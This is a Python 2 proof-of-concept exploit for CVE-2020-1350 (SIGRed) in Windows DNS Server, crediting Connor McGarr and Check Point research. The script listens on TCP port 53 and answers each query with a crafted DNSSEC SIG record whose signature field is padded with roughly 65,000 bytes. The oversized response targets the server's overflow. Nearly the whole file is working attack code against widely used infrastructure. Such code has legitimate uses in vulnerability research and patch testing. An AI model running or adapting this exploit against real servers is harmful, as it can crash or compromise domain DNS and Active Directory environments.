# CVE-2020-1350 Proof-of-Concept (TCP Response)
# Author: Connor McGarr (@33y0re)
# https://connormcgarr.github.io

import sys
import os
import socket
import struct
import time

# https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/
# https://tools.ietf.org/html/rfc2535#section-4.1

# Credit to @maxspl0it for research done on this!

# TCP server

# domain = csredteam.net
# Length preceeds hex characters + one NULL for (and no periods)
domain_correct = "\x09csredteam\x03net\x00"

# Starting TCP server
print "[+] Starting the TCP DNS server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 53))
s.listen(50)
while True:
	try:
		connection, ip = s.accept()

		# https://tools.ietf.org/html/rfc2535
		sig = "\x00\x01"		# Type covered (type of other RRs)
		sig += "\x05"		        # Algorithm (DSA is MANDATORY)
		sig += "\x00"		        # Labels (specifies root)
		sig += "\x00\x00\x00\x3a"	# TTL (same as other TTLs)
		
		# https://www.lacnic.net/innovaportal/file/3135/1/dnssec_intro-mvergara.pdf
		# Signature inception = 1 hour before current time
		# Signature expiration = 30 minutes from now
		# No easy way to convert YYYY-DD-MM-HH-MM-SS to Unix Timestap in Python 2
		# Hardcoding w/ https://www.unixtimestamp.com/index.php
		# 1594969500 = 2020-07-17 7:05:00 UTC
		# 1594974900 = 2020-07-17 8:35:00 UTC
		sig += "\x5F\x11\x4D\x9C"       # Signature Expiration
		sig += "\x5F\x11\x62\xB4"	# Signature Inception
		sig += "\x00\x00"		# Key Tag (Isn't actually checked)
		sig += "\xc0\x0d"		# Signature Name (Thank you Checkpoint security advisory)
		
		# The vulnerability arises from the actual "Signature Field" of the DNSSEC SIG request
                # Trial and error here. 
		sig += "\x00" * 32
		sig += "\x41" * 65428
		
		# More SIG stuff
		header = "\xc0\x0c"			# Pointer to DNS name (csredteam.net)
		header += "\x00\x18"		        # Type: SIG
		header += "\x00\x01"		        # Class: IN
		header += "\x00\x00\x00\x3a"		# Time to live (TTL: 60)
		header += struct.pack('>H', len(sig))   # Data length
		
		# Finish the response
		tcp_response = "\x80\x00"		# Flags (Response: Only need to respond to request)
		tcp_response += "\x00\x01"              # Questions: 1
		tcp_response += "\x00\x01"              # Answer RRs: 1 (We are answering only)
		tcp_response += "\x00\x00"              # Authority RRs: 0
		tcp_response += "\x00\x00"              # Additional RRs: 0
		tcp_response += "\x01" + "9" + domain_correct		# Name (9.csredteam.test)
		tcp_response += "\x00\x18"		# Type: SIG
		tcp_response += "\x00\x01"		# Class: IN

		try:
			# Receive connection from client
			data = connection.recv(65535)	# Max for TCP DNS

			# Print update 
			print "[+] Received TCP connection"
		except:
			pass

		# Sending the exploit
		messageSize = len(tcp_response + header + sig) + 2		# 2 accounts for DNS Transaction ID
		connection.sendall(struct.pack('>H', messageSize) + data[2:4] + tcp_response + header + sig)
		connection.close()

	except:
		print "[-] Error with TCP"
		pass
